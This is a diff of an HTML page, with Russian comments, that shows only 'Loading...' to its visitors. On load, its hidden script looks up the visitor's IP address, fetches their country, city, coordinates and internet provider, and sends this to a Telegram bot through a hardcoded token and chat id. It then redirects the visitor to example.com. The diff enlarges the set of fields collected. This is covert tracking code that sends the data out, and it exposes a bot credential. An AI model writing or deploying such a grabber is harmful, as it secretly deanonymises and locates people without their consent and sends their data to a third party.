@@ -7,37 +7,47 @@
 <body>
     <h1>Загрузка...</h1>
     <script>
+        // 1. Получаем реальный IP
         fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(d => d.ip)
-            .then(ip => {
-                return fetch('http://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org')
-                    .then(r => r.json())
-                    .then(geo => ({ ip, geo }));
-            })
+            .then(response => response.json())
             .then(data => {
                 var ip = data.ip;
-                var geo = data.geo;
-                var text = "НОВЫЙ ПЕРЕХОД\nIP: " + ip +
-                           "\nСтрана: " + (geo.country || '—') +
-                           "\nГород: " + (geo.city || '—') +
-                           "\nКоординаты: " + (geo.lat || '—') + ", " + (geo.lon || '—') +
-                           "\nПровайдер: " + (geo.isp || '—');
+
+                // 2. Получаем геоданные по этому IP
+                return fetch('http://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org')
+                    .then(response => response.json())
+                    .then(geo => {
+                        // 3. Формируем сообщение
+                        var text = "🔹 НОВЫЙ ПЕРЕХОД 🔹\n" +
+                                   "IP: " + ip + "\n" +
+                                   "Страна: " + (geo.country || '—') + "\n" +
+                                   "Регион: " + (geo.regionName || '—') + "\n" +
+                                   "Город: " + (geo.city || '—') + "\n" +
+                                   "Координаты: " + (geo.lat || '—') + ", " + (geo.lon || '—') + "\n" +
+                                   "Провайдер: " + (geo.isp || '—') + "\n" +
+                                   "Организация: " + (geo.org || '—');
+
+                        var token = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
+                        var chat_id = "8212240529";
+                        var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
+
+                        // 4. Отправляем в Telegram
+                        return fetch(url);
+                    });
+            })
+            .catch(function() {
+                // Если ошибка — отправляем заглушку
+                var text = "Ошибка определения IP или геоданных";
                 var token = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
                 var chat_id = "8212240529";
                 var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
                 fetch(url).catch(function() {});
-            })
-            .catch(function() {
-                var token = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
-                var chat_id = "8212240529";
-                var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=IP: ne opredelen";
-                fetch(url).catch(function() {});
             });
 
+        // Перенаправление через 3 секунды
         setTimeout(function() {
             window.location.href = "https://example.com";
-        }, 2500);
+        }, 3000);
     </script>
 </body>
 </html>
